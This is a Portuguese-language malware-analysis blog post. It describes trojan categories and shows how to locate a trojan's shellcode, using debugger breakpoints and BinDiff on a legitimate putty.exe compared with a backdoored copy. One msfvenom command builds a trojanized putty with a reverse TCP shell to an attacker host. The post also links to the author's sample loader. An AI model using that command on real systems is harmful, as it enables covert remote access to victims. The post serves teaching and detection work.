<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Security Researcher in Reversing/Malware/Low Level fields">
    <meta name="Author" content="Midnight Reverser">
    <meta name="keywords" content="midnighthackings midnight-rev midnight">
    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/syntax.css>
    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/style.css>
    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
    <title>Midnight Hackings - #FimDaEscala6x1</title>
  </head><body><aside id="sidenav">
    <header>
    
        <a href=https://blog.midnighthackings.com/><img src="https://blog.midnighthackings.com/avatar.png" alt="avatar"></a>
        
    

    <a id="branding" href=https://blog.midnighthackings.com/>
        
            Midnight's Home
        
    </a>
    </header>

    <nav>
        
            		
            <a href="/posts"
                
            >
                <i class="fas fa-keyboard fa-ms"></i>
                <span>posts</span>
            </a>
        
            		
            <a href="/tags"
                
            >
                <i class="fas fa-tags fa-ms"></i>
                <span>tags</span>
            </a>
        
            		
            <a href="https://github.com/midnight-rev"
                
                    target="_blank"
                
            >
                <i class="fab fa-github fa-ms"></i>
                <span>github</span>
            </a>
        
            		
            <a href="/index.xml"
                
            >
                <i class="fas fa-rss fa-ms"></i>
                <span>RSS</span>
            </a>
        
            		
            <a href="/contact"
                
            >
                <i class="far fa-envelope"></i>
                <span>contact</span>
            </a>
        
    </nav>
</aside>
<main id="main">
            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
            <div class="content">
<code>
    <center>
    <p style="font-weight: bolder;color: red;"> Midnight Hackings apoia o fim da escala 6x1. </p>
    <p style="font-weight: bolder;color: red;">Todos nós trabalhadores devemos ter direito à vida além do trabalho! Trabalhadores unidos mudam o mundo.</p>
    </center>
</code>
    
    <h1 id="title">Trojans: introdução, análise, BinDiff!</h1>
    
    
      
    <nav id="TableOfContents">
  <ul>
    <li><a href="#tipos-de-trojans">Tipos de trojans</a>
      <ul>
        <li><a href="#loader">Loader</a></li>
        <li><a href="#downloader">Downloader</a></li>
        <li><a href="#backdoorsshellrats">Backdoors/Shell/RATs</a></li>
        <li><a href="#keyloggerscreenlogger">Keylogger/Screenlogger</a></li>
        <li><a href="#informationstealer">InformationStealer</a></li>
        <li><a href="#banking">Banking</a></li>
        <li><a href="#criptominer">Criptominer</a></li>
      </ul>
    </li>
    <li><a href="#o-que-é-um-payloadshellcode">O que é um payload/shellcode</a></li>
  </ul>

  <ul>
    <li><a href="#identificando-trojans-através-de-apis-específicas">Identificando trojans através de APIs específicas</a>
      <ul>
        <li><a href="#a-ideia-para-identificação">A ideia para identificação</a></li>
      </ul>
    </li>
    <li><a href="#detectando-localização-de-trojans-com-bindiff">Detectando localização de trojans com BinDiff</a>
      <ul>
        <li><a href="#mas-afinal-o-que-é-bindiff">Mas afinal, o que é BinDiff?</a></li>
        <li><a href="#análise-do-putty-infectado-com-bindiff">Análise do putty infectado com BinDiff</a></li>
      </ul>
    </li>
  </ul>
</nav>
    <blockquote>
<hr>
<p>Escrito por: Mateus Gualberto (Midnight Reverser) - <strong>orgulho de escrever sem IA envolvida no processo!</strong></p>
<p>Licença: livre, como todo conhecimento deve ser.</p>
<hr>
</blockquote>
<h1 id="introdução">Introdução</h1>
<p>Nesse artigo, irei demonstrar algumas técnicas para identificação de trojans - em especial, focado nas técnicas comumente utilizadas pelo <a href="https://github.com/rapid7/metasploit-framework">Metasploit Framework</a>. Ao fim, é esperado que o leitor aprenda o que é um trojan, seu funcionamento, trojans comuns, e por fim como identificar e localizar a carga maliciosa de um software adulterado.</p>
<p>Caso o leitor deseje seguir a prática explicada nesse artigo, é necessário cumprir os seguintes pré-requisitos:</p>
<ul>
<li>Computador com o <a href="https://ghidra-sre.org">Ghidra</a> mais recente (necessário ter java instalado);</li>
<li><a href="https://github.com/google/bindiff">BinDiff</a> e plugin <a href="https://github.com/google/binexport">BinExport</a> para o Ghidra;</li>
<li>Download do arquivo infectado e do original, a serem analisados na seção <a href="#detectando-localiza%C3%A7%C3%A3o-de-trojans-com-bindiff">Detectando localização de trojans com BinDiff</a> - disponíveis <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/malware-analysis-0x00">nesse link</a>.</li>
</ul>
<blockquote>
<p>Quaisquer arquivos comprimidos que necessitam de senha, digite <code>infected</code></p>
</blockquote>
<br>
<br>
<h1 id="o-que-é-um-trojan">O que é um trojan</h1>
<p>Um trojan, ou cavalo de troia, é um malware que ludibria o usuário a executá-lo fazendo-o pensar que é um software legítimo, mas na realidade é um programa que contém código malicioso que roda em background. Esse termo também pode ser utilizado para classificar as cargas maliciosas que esses arquivos infectados executam. Nesse artigo, utilizaremos o termo trojan tanto para identificar os arquivos infectados - os &ldquo;containeres&rdquo; que carregam a carga maliciosa - quanto elas próprias. Os malwares que os programas adulterados carregam muitas vezes são <em>backdoors</em> ou <em>RATs</em>, que permitem conexão com servidores do atacante e execução remota de comandos.</p>
<p>Muitas vezes, as cargas maliciosas de um trojan estão contidas em um executável conhecido e legítimo (Figura 0x00). Nesses casos, quando o usuário inicia o trojan, sua carga maliciosa é executada de forma silenciosa, até mesmo permitindo o funcionamento normal do programa legítimo. Isso permite um sucesso maior na infecção e na reinfecção do alvo - afinal,  é só reexecutar o EXE para se reinfectar. Esse é o caso que construí e que analisaremos ao longo desse artigo.</p>
<p><img src="img/5f0befe2df60b2da0e0f54895f2507db.png" alt="5f0befe2df60b2da0e0f54895f2507db.png"></p>
<p><em>Figura 0x00 - Exemplo de putty.exe trojanizado com backdoor.</em></p>
<br>
<br>
<p>Outras infecções se dão por conta de <em>malspam</em> e <em>phishing</em>, através de documentos infectados. Documentos do pacote Microsoft Office são os mais utilizados para esse tipo de ataque, em especial os tipos introduzidos antes do Microsoft Office 2007: <em>DOC</em>, <em>XLS</em>, <em>PPT</em>.</p>
<p>Essa preferência não é por acaso: esses formatos permitem a execução de macros VBA - diferente dos formatos mais novos DOCX, XLSX e PPTX - fazendo com que esses tipos sejam facilmente infectados por threat actors, e enviados como <em>first stage loaders</em> em grandes campanhas de spam (Figura 0x01).</p>
<p><img src="img/b1b78a9626263785b153ad3600e5f63c.png" alt="b1b78a9626263785b153ad3600e5f63c.png">
<em>Figura 0x01 - Exemplo de arquivo DOC trojanizado com backdoor.</em></p>
<br>
<br>
<p>Medidas da Microsoft, como impedir a execução macros por padrão ao abrir um arquivo e só permitir caso o usuário realmente deseje executá-las, dificultam a infecção por parte dos threat actors (Figura 0x02). Os <em>maldocs</em> dos atacantes tiveram que mudar para enfrentar esse tipo de proteção, empregando técnicas de phishing e engenharia social para que as macros fossem habilitadas, como é o caso do trojan Emotet (Figura 0x03).</p>
<p><img src="img/99738301c825a825a466243441d837c5.png" alt="99738301c825a825a466243441d837c5.png"></p>
<p><em>Figura 0x02 - medidas aplicadas pela Microsoft para evitar a execução automática de macros em documentos.</em></p>
<p><img src="img/ae21fb0747e45ee1b1644c2f601f0ebb.png" alt="ae21fb0747e45ee1b1644c2f601f0ebb.png"></p>
<p><em>Figura 0x03 - documento malicioso do trojan Emotet, utilizando técnicas de persuasão da vítima. Fonte: <a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/">https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/</a></em></p>
<br>
<br>
<p>Trojans  ainda são prevalentes em sites de download alternativos e de softwares piratas, com uma grande taxa de sucesso devido à instrução de muitas dessas fontes para que seus usuários desativem os seus antivírus. Sem pelo menos uma análise superficial estática e dinâmica, qualquer software obtido nesses sites deve ser tratato com suspeita e precaução.</p>
<p>Devido ao seu potencial de infecção silenciosa e conexão com C2, threat actors criaram um mercado de <em>Malware-as-a-Service</em>, servindo seus trojans como meio de infecção para outros malwares, e criando um mercado de venda de credenciais (Figura 0x04). Dessa forma, um mesmo trojan pode realizar o deploy de vários outros malwares no ambiente, aumentando a criticidade e o impacto de uma infecção por tais artefatos.</p>
<p><img src="img/1ca7f1d5d53efb85648e03974b8779e5.png" alt="1ca7f1d5d53efb85648e03974b8779e5.png"></p>
<p><em>Figura 0x04 - mercado de logs de stealer no Telegram.</em></p>
<br>
<br>
<h2 id="tipos-de-trojans">Tipos de trojans</h2>
<p>De acordo com suas características, os trojans podem ser classificados em diversas categorias. Algumas delas estão listadas abaixo:</p>
<h3 id="loader">Loader</h3>
<p>Esse tipo de trojan carrega e executa outros malwares em memória. Geralmente sua carga maliciosa está ofuscada de alguma forma, e a desofuscação é um passo necessário antes da execução. Para isso, são feitas alocações de memória dinâmica (heap), desofuscação e cópia do malware para essa localização, e finalmente a execução. Informações mais técnicas estão disponíveis na seção <a href="#identificando-trojans-atrav%C3%A9s-de-apis-espec%C3%ADficas">Identificando trojans através de APIs específicas</a>.</p>
<p>Um exemplo de um trojan desse tipo está exemplificado <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a> (Figura 0x05).</p>
<p><img src="img/4615e18576b635e5ffbb847f6f0f8138.png" alt="4615e18576b635e5ffbb847f6f0f8138.png"></p>
<p><em>Figura 0x05 - trojan loader de autoinjeção e com as principais APIs utilizadas destacadas.</em>
<br>
<br></p>
<h3 id="downloader">Downloader</h3>
<p>Os downloaders são trojans semelhantes aos loaders, com a diferença que sua carga maliciosa é obtida via Internet, a partir de endereços C2. Funções da <code>Ws2_32.dll</code> (WSAStartup, WSAConnect e afins) e <code>wininet.dll</code> (<code>InternetOpen</code>, <code>InternetOpenUrlA</code>, etc) são comumente encontradas nesse tipo de trojan.</p>
<p><em>Indicadores de comprometimento</em> (IoCs) comuns em downloaders incluem IPs e domínios pertencentes aos atacantes. Para evadir detecção e bloqueios, atacantes recorrem ao uso de listas dinâmicas de IPs/domínios obtidas por C2/serviços web de boa reputação, ou usam <em>Domain Generation Algorithms</em> (DGAs), que geram milhares de domínios a partir de uma seed e um algoritmo pseudoaleatório - permitindo ao atacante sempre gerar um novo domínio, registrá-lo e continuar o ataque (Figura 0x06). Mais sobre DGAs <a href="https://www.akamai.com/glossary/what-are-dgas">nesse artigo da Akamai</a>.</p>
<p><img src="img/618a32c7e892e3a79c3827003c869d83.png" alt="618a32c7e892e3a79c3827003c869d83.png"></p>
<p><em>Figura 0x06 - exemplo de execução de algoritmo DGA utilizado pelo trojan Ramnit. Fonte: <a href="https://raw.githubusercontent.com/baderj/domain_generation_algorithms/refs/heads/master/ramnit/dga.py">https://raw.githubusercontent.com/baderj/domain_generation_algorithms/refs/heads/master/ramnit/dga.py</a></em>
<br>
<br></p>
<h3 id="backdoorsshellrats">Backdoors/Shell/RATs</h3>
<p>Provavelmente é o tipo mais conhecido de trojans, em que um aplicativo infectado dá acesso ao computador da vítima ao ser executado pelo usuário. Essa conexão pode ser direta ou reversa, utilizar TCP/UDP, HTTP/HTTPS, entre outros protocolos. Eles dão acesso ao sistema infectado sem necessidade de reinfecção posterior, devido a suas capacidades de elevação de privilégios e persistência local (Figura 0x07).</p>
<p><img src="img/885ec9c2c7b3949094d5c10b7faad8df.png" alt="885ec9c2c7b3949094d5c10b7faad8df.png"></p>
<p><em>Figura 0x07 - execução de uma shell do Metasploit Framework.</em></p>
<p>Sobre as terminologias:</p>
<ul>
<li>Backdoors têm esse nome por serem malwares que dão acesso ao sistema infectado mesmo se a fonte inicial de infecção (uma exploração de vulnerabilidades, a execução do usuário) for corrigida e não puder ser utilizada novamente. Isso é possível através da comunicação remota e persistente com um servidor C2 do atacante;</li>
<li>Shells são malwares que proveem uma interface de linha de comando para o atacante, permitindo a execução remota de códigos através do <em>bash</em>, <em>sh</em>, <em>cmd</em> ou <em>powershell</em>, por exemplo;</li>
<li><em>Remote Access Tools</em> ou RATs, podem ser softwares legítimos (como AnyDesk, TeamViewer) ou não (njRAT, Remcos RAT), que proveem uma interface e comandos mais avançados que uma simples shell - contando com uma conexão gráfica remota, caso o host vítima permita, ferramentas para download/upload de arquivos, entre outras funcionalidades. São softwares complexos e com alto impacto na confidencialidade/integridade das informações dos computadores infectados (Figura 0x08).</li>
</ul>
<p><img src="img/ed3214bb53b4dd77e6aefd891e27124f.png" alt="ed3214bb53b4dd77e6aefd891e27124f.png"></p>
<p><em>Figura 0x08 - exemplo da execução do Quasar, um RAT opensource para Windows. Fonte: <a href="https://github.com/quasar/Quasar">https://github.com/quasar/Quasar</a></em></p>
<br>
<br>
<h3 id="keyloggerscreenlogger">Keylogger/Screenlogger</h3>
<p>Trojans keylogger capturam eventos do teclado e screenloggers capturam imagens da tela e enviam para o atacante. Senhas, dados pessoais e qualquer interação com o teclado ou a tela do computador podem ser vistos pelos atacantes, resultando em impactos significativos a individuais e a infraestruturas de negócio (Figura 0x09).</p>
<p>Funções que permitem realizar hooks em outras aplicações, como <code>SetWindowsHookExA</code> da <code>user32.dll</code> são comumente encontradas nesse tipo de malware.</p>
<p><img src="img/91250aae74ea4490c52017477b7d2757.png" alt="91250aae74ea4490c52017477b7d2757.png"></p>
<p><em>Figura 0x09 - arquivo de log de teclas gerado por um keylogger. Fonte: <a href="https://en.wikipedia.org/wiki/Keystroke_logging">https://en.wikipedia.org/wiki/Keystroke_logging</a></em></p>
<br>
<br>
<h3 id="informationstealer">InformationStealer</h3>
<p>Mais conhecidos pelos exemplares <em>Azorult</em> e <em>Lumma Stealer</em>, são malwares que focam em roubar informações do usuário das mais variadas fontes disponíveis - senhas salvas em navegadores, cookies de autenticação e outros tipos de informações pessoais. Esse tipo de trojan é um dos mais utilizados como <em>Malware-as-a-Service</em> (MaaS) para venda de credenciais e informações pessoais (Figura 0x0A).</p>
<p><img src="img/4c0af17b1c8965b62f1e752cfa589bc9.png" alt="4c0af17b1c8965b62f1e752cfa589bc9.png"></p>
<p><em>Figura 0x0A - exemplo de logs do Redline information stealer. Fonte: <a href="https://www.zerofox.com/blog/an-introduction-to-stealer-logs/">https://www.zerofox.com/blog/an-introduction-to-stealer-logs/</a></em></p>
<br>
<br>
<h3 id="banking">Banking</h3>
<p>Trojans bancários, como o <em>Astaroth/Guildma</em>, <em>Amavaldo</em>, <em>IcedID</em> e tantos outros focam em coletar credenciais bancárias e modificar páginas web ou realizar hook de transações em aplicativos de banco para mudar o fluxo das transações para contas dos atacantes.</p>
<p>As variantes latinoamericanas observadas na última década são extremamente ofuscadas, contando com múltiplos estágios, e na maioria das vezes escritas em Delphi. Uma análise detalhada da ESET do Amavaldo, de cinco anos atrás, pode ser encontrada <a href="https://www.welivesecurity.com/2019/08/01/banking-trojans-amavaldo/">nesse link</a>.</p>
<br>
<br>
<h3 id="criptominer">Criptominer</h3>
<p>Esse tipo de malware realiza o deploy de mineradores de criptomoeadas, como o <a href="https://github.com/xmrig/xmrig">XMRig</a>, sugando a maior parte dos recursos da máquina alvo com objetivo de minerar moedas. Pode ser detectado devido ao alto uso de CPU/memória nos computadores infectados.</p>
<blockquote>
<p>É importante notar que, apesar das classificações acima, na prática vários trojans reais se enquadram em mais de uma classificação.</p>
</blockquote>
<br>
<br>
<h2 id="o-que-é-um-payloadshellcode">O que é um payload/shellcode</h2>
<p>Payloads são uma sequência de instruções, geralmente a nível de código de máquina, utilizados em exploits e infecções como uma carga maliciosa que deseja-se executar na vítima. Shellcode, inicialmente, era um payload que executava um malware do tipo <em>shell</em>, que resultava em uma conexão direta ou reversa com o alvo para executar comandos. Entretanto, hoje em dia muitas vezes esses termos são usados de forma intercambiável - executar uma shell é um procedimento padrão e muito buscado durante a execução remota de códigos.</p>
<p>Além disso, shellcodes/payloads não necessitam de estar em um endereçamento específico da memória para funcionarem, podendo serem injetados no mesmo processo ou em processos remotos. Toda API de biblioteca externa necessita de resolução via runtime linking (conceito explicado <a href="https://blog.midnighthackings.com/posts/base-0x00/#runtime-linking-run-time-dynamic-linking">nesse artigo</a>). Por esse motivo, muitos deles aplicam a técnica de API Hashing para dificultar a análise.</p>
<p>Trojans gerados por frameworks de segurança ofensiva, como o Metasploit e o Cobalt Strike, têm opção de serem gerados em formato de shellcode e combinados em um executável template. Essa abordagem visa enganar as vítimas em executar um software legítimo, mas que em algum momento irá chamar o shellcode e trazer uma conexão para o atacante.</p>
<p>Para gerar um trojan x86 no metasploit e infectar um executável como o <a href="https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe">putty original</a>, podemos executar o seguinte comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -x putty.exe -k -o putty_infected.exe
</span></span></code></pre></div><p>No qual:</p>
<ul>
<li><em>-p</em> -&gt; seleciona o payload para infecção <em>windows/shell_reverse_tcp</em> (shell reversa, via TCP, para windows x86, sem estágio - todo o payload estará no binário final);</li>
<li><em>LHOST</em> -&gt; IP do C2 do atacante;</li>
<li><em>LPORT</em> -&gt; porta utilizada para conexão ao C2;</li>
<li><em>-f</em> -&gt; formato a ser gerado a shell - no caso, queremos um EXE ao final;</li>
<li><em>-x</em> -&gt; seleciona um executável para template, que será transformado em um trojan;</li>
<li><em>-k</em> -&gt; informa ao framework que o trojan deve funcionar como o software legítimo;</li>
<li><em>-o</em> -&gt; especifica o nome do trojan gerado.</li>
</ul>
<blockquote>
<p>Lembrando ao leitor que, caso deseje os exatos artefatos que iremos analisar nas seguintes seções, o link está disponível na seção <a href="#introdu%C3%A7%C3%A3o">Introdução</a>.</p>
</blockquote>
<br>
<br>
<h1 id="técnicas-de-detecção-de-trojans">Técnicas de detecção de trojans</h1>
<p>Nessa seção, vamos estudar algumas técnicas para detecção de trojans, focando em trojans backdoor. Analisaremos o caso de uma infecção do putty como prática dos conceitos estudados.</p>
<h2 id="identificando-trojans-através-de-apis-específicas">Identificando trojans através de APIs específicas</h2>
<p>Um shellcode ofuscado reside na memória, geralmente em uma seção de dados, quando armazenado de forma global, ou na stack, quando armazenado no escopo de uma função. Em ambos os casos, não há permissão de execução por padrão - exceto no caso da stack em binários sem bit no-execute (NX - Linux) ou sistemas Windows com <em>Data Execution Prevention</em> (DEP) desabilitado ou modificado para aquele binário em específico.</p>
<p>Nesse caso, é necessário alocar na heap o shellcode, em uma região da memória que deverá ser possível realizar operações de leitura, escrita e execução em algum momento. Isso é feito através de algumas APIs em específico:</p>
<ul>
<li><code>VirtualAlloc</code></li>
<li><code>VirtualAllocEx</code></li>
<li><code>VirtualProtect</code></li>
</ul>
<blockquote>
<p>VirtualProtect não aloca memória, mas muda suas permissões - uma memória que era RW pode se tornar RWX!</p>
</blockquote>
<p>Após isso, é realizada a cópia/desofuscação em memória do shellcode para o espaço na heap criado por essas APIs. Essa cópia pode se dar com <em>memcpy</em>, <em>RtlMoveMemory</em> ou um simples loop sem nenhuma chamada de API. Nessa fase, também, caso haja injeção remota, são chamadas APIs para escrever o shellcode no processo remoto, como <em>WriteProcessMemory</em>.</p>
<p>Por fim, o payload precisa ser executado de alguma forma. As técnicas clássicas envolvem o uso de APIs como:</p>
<ul>
<li><code>CreateThread</code></li>
<li><code>CreateRemoteThread</code></li>
<li><code>ResumeThread</code></li>
</ul>
<p>Porém, note que a API utilizada para executar o shellcode no caso X pode ser diferente da utilizada no caso Y. Isso se deve à evolução das técnicas de injeção e execução de shellcode ao longo do tempo. Por exemplo, no caso da injeção via <a href="https://blog.midnighthackings.com/posts/maldev-0x00/#apc-injection-cl%C3%A1ssico"><em>Asynchronous Procedure Calls</em> (APC)</a>, a API <em>QueueUserAPC</em>, que realiza o enfileiramento do shellcode na APC do processo remoto, é a última chamada no injetor antes da infecção efetiva do processo remoto.</p>
<br>
<br>
<h3 id="a-ideia-para-identificação">A ideia para identificação</h3>
<p>Com base no que foi citado acima, a ideia principal para localização do shellcode é realizar um breakpoint de software nas funções de alocação de memória (<em>VirtualAlloc</em>, por exemplo), executá-las e pegar no registrador EAX (retorno) o endereço da memória alocada. A partir daí, deve segui-las em um dump de memória, e seguir a execução do código normalmente.</p>
<p>Em algum momento, um dos dumps de memória seguidos deve dar origem a opcodes válidos, como <code>FC</code> e <code>E8</code>. Uma boa experiência na tratativa desse tipo de malware pode ajudar a identificar mais facilmente esse tipo de situação. A partir daí, é realizar o dump da localização de memória via debugger ou ferramenta de monitoramento de processos (Process Explorer, Process Hacker) e começar a análise do shellcode em si.</p>
<p>Mas e como descobrir que todas as operações em memória foram realizadas no shellcode (como desofuscação)? Continuando atentamente o processo de debugging e colocando um breakpoint de hardware na escrita/execução (no caso de autoinjeção) ou em funções que podem executar/escrever o shellcode (<em>RtlMoveMemory</em>, <em>WriteProcessMemory</em>, <em>memcpy</em>, etc). Funções como <em>CreateThread</em>, <em>CreateRemoteThread</em> também trazem a informação de qual endereço do primeiro byte que deve ser executado pela thread criada. Essas técnicas podem ajudar a descobrir quando o processamento do payload está finalizado.</p>
<blockquote>
<p>Note que, a identificação e dump não significa que todo o payload está desofuscado: pode haver rotinas de reescrita/descompressão/descriptografia de código no próprio shellcode.</p>
</blockquote>
<br>
<br>
<h4 id="exemplo-shellcodeexecutor">Exemplo: ShellcodeExecutor</h4>
<p>O trojan loader que produzi, que está <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>, por exemplo, contém um shellcode altamente ofuscado, mas que pode ser isolado facilmente utilizando a técnica explicada (BP no <em>VirtualAlloc</em> e no <em>CreateThread</em>).</p>
<p>O breakpoint no VirtualAlloc nos traz um endereço alocado na heap com as permissões de leitura, escrita e execução - o que nos deixa suspeitos sobre ela (Figuras 0x0B e 0x0C).</p>
<p><img src="img/07befb4d81eeebf3253c2c8cb6e52296.png" alt="07befb4d81eeebf3253c2c8cb6e52296.png"></p>
<p><em>Figura 0x0B - memória alocada com VIrtualAlloc seguida no dump.</em></p>
<p><img src="img/bb9b61b24f638d7ef0567fa0577d67b9.png" alt="bb9b61b24f638d7ef0567fa0577d67b9.png"></p>
<p><em>Figura 0x0C - memória alocada pelo VirtualAlloc é RWX.</em></p>
<br>
<br>
<p>Seguindo no dump e executando até o <em>CreateThread</em>, é possível perceber que o espaço alocado, anteriormente vazio, agora está preenchido de bytes (Figura 0x0D). Analisando no disassembler, é possível verificar instruções iniciais e um loop de desofuscação dos bytes seguintes (Figura 0x0E). Esses bytes válidos e a rotina de desofuscação também válida nos permite provar que esse é o nosso shellcode!</p>
<p><img src="img/e08b5eba15cc729d8a098e005b886f08.png" alt="e08b5eba15cc729d8a098e005b886f08.png"></p>
<p><em>Figura 0x0D - shellcode no dump antes de criar a thread de execução.</em></p>
<p><img src="img/77b6a26933035a2c7c239ea82ec421c1.png" alt="77b6a26933035a2c7c239ea82ec421c1.png"></p>
<p><em>Figura 0x0E - shellcode no disassembler após desofuscação inicial; apenas alguns step intos e executando todo o primeiro loop à exaustão</em></p>
<br>
<br>
<h2 id="detectando-localização-de-trojans-com-bindiff">Detectando localização de trojans com BinDiff</h2>
<p>Essa técnica agiliza a análise realizada em um executável trojanizado, caso o analista tenha acesso o software legítimo. Dependendo do binário, múltiplas técnicas de binary diffing podem ser empregadas - falaremos mais delas na análise do putty infectado, citado na <a href="#introdu%C3%A7%C3%A3o">Introdução</a> desse artigo.</p>
<h3 id="mas-afinal-o-que-é-bindiff">Mas afinal, o que é BinDiff?</h3>
<p>Binary diffing referem-se a algoritmos e ferramentas utilizadas para comparar diferenças entre dois arquivos binários - como EXEs, DLLs, entre outros. Essas diferenças podem ser uma simples alteração de instruções, inclusão/exclusão de rotinas inteiras ou mudança de fluxo dentro de uma função, entre outros tipos de mudanças.</p>
<p>BinDiff é uma ferramenta, atualmente opensource, que compara dois binários com diversos algoritmos. É possível checar por similaridade de funções, funções incluídas/excluídas entre um e outro binário, obter estatísticas (quantidade de funções, jumps, instruções etc). Para utilizá-la, é necessário exportar os binários no formato <em>.BinDiff</em> - algo que pode ser feito pelo plugin binexport.</p>
<p>Além de auxiliar na análise de malware, algoritmos de binary diffing podem ajudar na aplicação de patches, busca de vulnerabilidades em softwares mais antigos, entre outros usos.</p>
<h3 id="análise-do-putty-infectado-com-bindiff">Análise do putty infectado com BinDiff</h3>
<p>Vamos à análise do putty infectado, disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/malware-analysis-0x00">nesse link</a>.</p>
<p>Para essa técnica, é necessário a instalação do <a href="https://ghidra-sre.org">Ghidra</a>, para análise inicial e disassembly das instruções, <a href="https://github.com/google/binexport/releases/tag/v12-20240417-ghidra_11.0.3">BinExport para Ghidra</a>, para gerar os arquivos de BinDiff a serem comparados, e o próprio software <a href="https://github.com/google/bindiff">BinDiff</a>, que irá comparar os arquivos gerados pelo plugin do BinExport.</p>
<p>Primeiramente, vamos analisar os binários - adicionar um projeto no ghidra, importar os dois EXEs, realizar a análise automatizada inicial do EXE e salvar - o cotidiano de um analista de malware.</p>
<p>Após a instalação do BinExport e reinício do Ghidra, há a opção de exportar os binários via clique secundário (Figura 0x0F). Caso o BinExport tenha sido corretamente instalado, aparecerá o formato &ldquo;Binary BinExport (v2) for BinDiff&rdquo;, e é esse o export que queremos.</p>
<blockquote>
<p>Nota: realize esse processo apenas quando os binários já tiverem sido analisados pelo ghidra.</p>
</blockquote>
<p><img src="img/f1d644e630be91ebda8a973234b4d48c.png" alt="f1d644e630be91ebda8a973234b4d48c.png"></p>
<p><em>Figura 0x0F - exportação dos arquivos BinDiff referentes ao arquivo legítimo e ao infectado via Ghidra, pós análise automatizada.</em></p>
<br>
<br>
Já no BinDiff, vamos criar um novo workspace e realizar a importação de um novo Diff: o primeiro sendo o binário legítimo (putty.exe) e o segundo o trojan (putty_infected.exe) (Figura 0x10). Após a importação, ao clicar duas vezes no Diff criado trará diversas informações sobre as diferenças entre os binários (Figura 0x11).
<p><img src="img/49da4a38b2509f4fa871a266951bdeba.png" alt="49da4a38b2509f4fa871a266951bdeba.png"></p>
<p><em>Figura 0x10 - importação dos artefatos gerados pelo Ghidra no software BinDiff.</em></p>
<p><img src="img/fdf7c7d2dc0441ac30c512eaca70402d.png" alt="fdf7c7d2dc0441ac30c512eaca70402d.png"></p>
<p><em>Figura 0x11 - análises disponíveis via software BinDiff para o caso analisado.</em></p>
<br>
<br>
Nesse ponto, várias técnicas podem ser empregadas para localizar a carga maliciosa: analisar as funções que estão presentes apenas no binário infectado, analisar o fluxo de chamadas, etc. No caso do putty, vamos primeiro verificar as funções que estão presentes em ambos os binários (Matched Functions).
<p>Uma análise importante a ser realizada é a de similaridade entre funções. Uma similaridade de 100% não nos interessa, pois a função não foi adulterada. Já uma similaridade média ou alta pode pode indicar uma adulteração, então essas funções devem ser analisadas atentamente.</p>
<p>No caso do putty, temos apenas uma função com similaridade diferente de 100%, para a nossa sorte (Figura 0x12). Essa função é o entrypoint do binário, local comum de infecção para trojans. Clicando duas vezes na função, obtemos o seguinte gráfico e disassembly:</p>
<p><img src="img/edfd64d3415428c55aa5ce54ff241257.png" alt="edfd64d3415428c55aa5ce54ff241257.png"></p>
<p><em>Figura 0x12 - única função com similaridade diferente de 100% nas funções presentes em ambos os binários.</em>
<br>
<br></p>
<p>Note que o entrypoint do binário legítimo contém apenas duas instruções, enquanto que o entrypoint do binário infectado traz bem mais instruções, além de chamadas para funções suspeitas - <em>CreateThread</em> - (Figura 0x13).</p>
<p><img src="img/6c78637f1c85fdfd288f54f7a90505a0.png" alt="6c78637f1c85fdfd288f54f7a90505a0.png"></p>
<p><em>Figura 0x13 - diferença do entrypoint do putty.exe (à esquerda) e do putty_infected.exe (à direita).</em>
<br>
<br></p>
<p>Ao verificar a localização do código que rodará em uma nova thread (<code>0x573047</code>) via Ghidra, é possível perceber a execução de algumas instruções comumente vistas em shellcode (CLD, CALL aparentemente sem parâmetros ou sem <em>caling convention</em> definida) (Figura 0x14).</p>
<p>O endereço <code>0x5730d5</code> é chamado pela CALL, redirecionando a execução para uma estrutura claramente relacionada a shellcode - push de valores semelhantes a API hashing, chamada de funções a partir de endereços em registradores, ausência de chamada para APIs de DLLs a partir de <em>dynamic linking</em>, entre outros indicadores (Figura 0x15).</p>
<p><img src="img/17bdecea28143dbcfb87f9061d0a520b.png" alt="17bdecea28143dbcfb87f9061d0a520b.png"></p>
<p><em>Figura 0x14 - início da função executada via CreateThread (<code>0x573047</code>).</em></p>
<p><img src="img/23c289c79e35e8f4ad1dc338feccc8ca.png" alt="23c289c79e35e8f4ad1dc338feccc8ca.png"></p>
<p><em>Figura 0x15 - código a ser executado posteriormente na mesma thread criada - o próprio shellcode (<code>0x5730d5</code>).</em></p>
<br>
<br>
Voltando ao BinDiff, também seria possível identificar parte do shellcode através das funções que estão presentes apenas no binário infectado - outra forma de encontrar tais cargas maliciosas (Figura 0x16).
<p><img src="img/5e298de9402dedf6d927afc66e044a00.png" alt="5e298de9402dedf6d927afc66e044a00.png"></p>
<p><em>Figura 0x16 - identificação do shellcode via funções existentes apenas no binário infectado, no software BinDiff.</em></p>
<p>Dessa forma, conseguimos encontrar o shellcode e evidênciá-lo em um reporte de análise/pesquisa de malwares.</p>
<br>
<br>
<h1 id="conclusão">Conclusão</h1>
<p>Nesse artigo, foi explicado o que era um trojan, seus tipos e cargas maliciosas executadas no computador-vítima e técnicas de detecção, identificação e localização da carga maliciosa desses malwares - em especial, para as técnicas de infecção empregadas pelo Metasploit Framework.</p>
<p>No próximo artigo, analisaremos os shellcodes resultantes desses tipos de malware, através de técnicas de análise de malwares.</p>

    
    <div class="nav-next-prev">
        <div class="nav-prev">
            
